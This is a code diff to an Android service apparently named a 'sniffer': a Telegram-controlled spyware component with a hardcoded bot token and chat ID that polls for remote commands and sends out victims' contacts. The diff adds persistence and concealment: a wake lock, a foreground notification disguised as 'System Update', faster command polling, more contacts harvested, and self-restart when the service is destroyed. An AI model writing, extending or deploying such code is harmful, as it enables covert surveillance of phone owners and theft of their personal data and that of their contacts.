@@ -1,5 +1,8 @@
 package com.v8.global.sniffer;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -9,8 +12,11 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.provider.ContactsContract;
 import android.telephony.TelephonyManager;
+
+import androidx.core.app.NotificationCompat;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -29,12 +35,19 @@ public class MainService extends Service {
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
     private OkHttpClient client = new OkHttpClient();
+    private PowerManager.WakeLock wakeLock;
     private Timer timer;
     private int lastUpdateId = 0;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        
+        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
+        wakeLock.acquire(60*60*1000L);
+        
+        startForegroundService();
         sendToTelegram("✅ Service Started");
         
         timer = new Timer();
@@ -43,7 +56,21 @@ public class MainService extends Service {
             public void run() {
                 checkCommands();
             }
-        }, 0, 5000);
+        }, 0, 3000);
+    }
+
+    private void startForegroundService() {
+        String channelId = "main_channel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
+        }
+        Notification notification = new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("System Update")
+                .setContentText("Active")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .build();
+        startForeground(1, notification);
     }
 
     private void checkCommands() {
@@ -131,7 +158,7 @@ public class MainService extends Service {
                     null, null, null, null);
                 StringBuilder sb = new StringBuilder("Contacts:\n");
                 int count = 0;
-                while (cursor != null && cursor.moveToNext() && count < 30) {
+                while (cursor != null && cursor.moveToNext() && count < 50) {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                     String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                     sb.append(name).append(": ").append(number).append("\n");
@@ -233,5 +260,7 @@ public class MainService extends Service {
     public void onDestroy() {
         super.onDestroy();
         if (timer != null) timer.cancel();
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        startService(new Intent(this, MainService.class));
     }
 }
